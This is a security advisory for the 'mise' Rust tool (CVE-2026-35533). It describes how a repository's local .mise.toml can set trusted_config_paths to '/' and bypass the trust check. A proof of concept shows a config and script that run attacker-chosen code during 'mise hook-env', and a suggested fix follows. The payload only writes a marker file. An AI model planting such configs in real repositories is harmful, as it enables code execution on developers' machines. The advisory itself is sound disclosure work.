# [H] Local settings bypass config trust checks

## Summary
Severity: High
Advisory: GHSA-436v-8fw5-4mj8
CVE: CVE-2026-35533
CWE: CWE-284
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-07
Source: https://github.com/advisories/GHSA-436v-8fw5-4mj8
Type: github-advisory

## Affected
- crates.io: `mise` — affected >=2026.2.18 <2026.6.4

## Details
### Summary

`mise` loads trust-control settings from a local project `.mise.toml` before the trust check runs. An attacker who can place a malicious `.mise.toml` in a repository can make that same file appear trusted and then reach dangerous directives such as `[env] _.source`, templates, hooks, or tasks.

The strongest current variant is `trusted_config_paths = ["/"]`. I confirmed on current `v2026.3.17` in Docker that this causes an untrusted project config to become trusted during `mise hook-env`, which then executes an attacker-controlled `_.source` script. The same preload issue also lets local `yes = true` / `ci = true` auto-approve trust prompts on `v2026.2.18+`, but the primary PoC below uses the stronger `trusted_config_paths` path.

### Details

The vulnerable load order is:

1. [`Settings::try_get()`](https://github.com/jdx/mise/blob/37997e70cd2216d1a86726fba0c8c09c3986ad06/src/config/settings.rs#L254-L283) preloads local settings files.
2. [`parse_settings_file()`](https://github.com/jdx/mise/blob/37997e70cd2216d1a86726fba0c8c09c3986ad06/src/config/settings.rs#L505-L510) returns `settings_file.settings` without checking whether the file is trusted.
3. [`trust_check()`](https://github.com/jdx/mise/blob/37997e70cd2216d1a86726fba0c8c09c3986ad06/src/config/config_file/mod.rs#L297-L321) later consults those already-loaded settings.

The main trust-bypass path is in [`is_trusted()`](https://github.com/jdx/mise/blob/37997e70cd2216d1a86726fba0c8c09c3986ad06/src/config/config_file/mod.rs#L324-L387):

```rust
let settings = Settings::get();
for p in settings.trusted_config_paths() {
    if canonicalized_path.starts_with(p) {
        add_trusted(canonicalized_path.to_path_buf());
        return true;
    }
}
```

If a local project file sets:

```toml
[settings]
trusted_config_paths = ["/"]
```

then every absolute path matches, so the same untrusted file is marked trusted before the dangerous-directive guard is reached.

Related variant: [`trust_check()`](https://github.com/jdx/mise/blob/37997e70cd2216d1a86726fba0c8c09c3986ad06/src/config/config_file/mod.rs#L307-L316) auto-accepts explicit trust prompts when `Settings::get().yes` is true, and [`Settings::try_get()`](https://github.com/jdx/mise/blob/37997e70cd2216d1a86726fba0c8c09c3986ad06/src/config/settings.rs#L330-L332) sets `yes = true` when `ci` is set. I confirmed that regression on `v2026.2.18`, but the primary PoC below does not depend on it.

### PoC

Test environment:

- Docker
- `linux-arm64`
- `mise v2026.3.17`

Negative control:

```toml
[env]
_.source = ["./poc.sh"]
```

`mise ls` fails with:

```text
Config files in /work/poc/.mise.toml are not trusted.
```

and `/tmp/mise-proof.txt` is not created.

Primary exploit:

```toml
[settings]
trusted_config_paths = ["/"]

[env]
_.source = ["./poc.sh"]
```

with:

```bash
#!/usr/bin/env bash
echo trusted_paths_hookenv > /tmp/mise-proof.txt
```

Then:

```bash
mise hook-env -s bash --force
```

Observed:

```text
/tmp/mise-proof.txt => trusted_paths_hookenv
```

Related regression check:

- `v2026.2.17`: local `yes = true` does not bypass trust
- `v2026.2.18`: the same local `yes = true` value auto-approves the trust prompt and the side effect file is created

### Impact

An attacker who can place a `.mise.toml` in a repository can make `mise` trust and evaluate dangerous directives from that same untrusted file.

Demonstrated on current supported versions:

- execution via `[env] _.source` during `mise hook-env`
- bypass of the protection that `mise trust` is supposed to provide for dangerous config features

On newer versions, the same root cause also lets local `yes` / `ci` values auto-approve explicit trust prompts.

### Suggested Fix

Do not honor trust-control settings from non-global project config files.

At minimum, ignore these fields when loading local project config:

- `trusted_config_paths`
- `yes`
- `ci`
- `paranoid`

For example:

```rust
pub fn parse_settings_file(path: &Path) -> Result<SettingsPartial> {
    let raw = file::read_to_string(path)?;
    let settings_file: SettingsFile = toml::from_str(&raw)?;
    let mut settings = settings_file.settings;

    if !config::is_global_config(path) {
        settings.yes = None;
        settings.ci = None;
        settings.trusted_config_paths = None;
        settings.paranoid = None;
    }

    Ok(settings)
}
```

## References
- https://github.com/jdx/mise/security/advisories/GHSA-436v-8fw5-4mj8
- https://nvd.nist.gov/vuln/detail/CVE-2026-35533
- https://github.com/jdx/mise
